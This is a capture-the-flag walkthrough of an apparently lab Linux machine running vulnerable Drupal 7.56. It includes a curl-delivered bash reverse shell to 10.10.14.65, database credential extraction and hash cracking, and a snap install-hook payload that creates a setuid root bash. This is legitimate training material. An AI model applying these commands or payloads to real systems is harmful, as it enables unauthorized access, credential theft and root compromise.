1, port scan and web-content enumeration
22/tcp ssh
80/tcp http

By fuzzing the web-content, we can get many interesting urls.

![](images/Pasted%20image%2020240818095444.png)

`/robots.txt  /web.config /xmlrpc.php /index.php'
These urls would be useful for us.

2,check web pages and resources.
(*1*), `/robots.txt
```
Let's check /LICENSE.txt and find some versions.(Very sad, I cannot find anything useful.)

/install.php we can get a hint: # Drupal already installed
So just check the service or versions.

/CHANGELOG.txt #Drupal 7.56, 2017-06-21
This further confirms our previous findings.

Then we can find the exploits :
#CVE-2018-7600 | Drupal 8.5.x < 8.5.1 / 8.4.x < 8.4.6 / 8.x < 8.3.9 / 7.x? < 7.58 / < 6.x? - 'Drupalgeddon2' RCE (SA-CORE-2018-002)

https://github.com/dreadlocked/Drupalgeddon2.git

This is a RCE vulnerablity.So let's try to use it.

```

3,get the user shell
We just need to run the exploit script, then we can get the apache shell (www-data)

Then we need to switch to the local user :`brucetherealadmin
```
#/etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash

```

Before we enumerate the machine, we need to make a stable shell for us.
`curl -G --data-urlencode "c=bash -i >& /dev/tcp/10.10.14.65/443 0>&1" 'http://10.10.10.233/shell.php'`

Thus, let's enumerate the configurations and databases.

Then we can find a useful file `/var/www/html/sites/default/settings.php`
and we find the database password 
```
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);

```

Let's try it to shell as user but very sadly, we cannot login directly.

Come to enumerate the database 
`mysql -u drupaluser -p `
In this place, Because my shell is a not in a PTY, I’ll have to run DB commands from the command line. Drupal creates a bunch of tables:

`mysql -e 'show tables;' -u drupaluser -p'CQHEy@9M*m23gBVj' drupal`

`mysql -e 'select * from users;' -u drupaluser -p'CQHEy@9M*m23gBVj' drupal`

Finally, we get a credit
`brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt`

Then crack the password
	we can get `brucetherealadmin:booboo`

Then just ssh to get the user shell.

4, get the root shell
Firstly ,we can check `sudo -l`
```
Matching Defaults entries for brucetherealadmin on armageddon:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```

To be honest, we can just find something useful from GTFOBins.

```
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

It runs commands using a specially crafted Snap package. Generate it with fpm and upload it to the target.

COMMAND=id
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta
sudo snap install xxxx_1.0_all.snap --dangerous --devmode
```

```
The next step was to create the snap and download it onto the target box and install it. However, I ran into problems so I watched IppSec’s video >>HERE<< to guide me through it. First, on the target box, I copied /usr/bin/bash to /home/brucetherealadmin/bash.
```

`[brucetherealadmin@armageddon ~]$ cp /usr/bin/bash ~/bash`

Next, I modified the payload as shown below and executed it on my local system.
```
COMMAND="chown root:root /home/brucetherealadmin/bash; chmod 4755 /home/brucetherealadmin/bash"
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta
```


Finally, I downloaded the snap using cURL and installed it.

As you can see from the screenshot below, the snap was installed successfully. However, more importantly, it ran the command to change the ownership and permissions of the bash file. The file was now owned by root and had setuid set.
![](images/Pasted%20image%2020240818111718.png)

`./bash -p`

Then we can shell as root.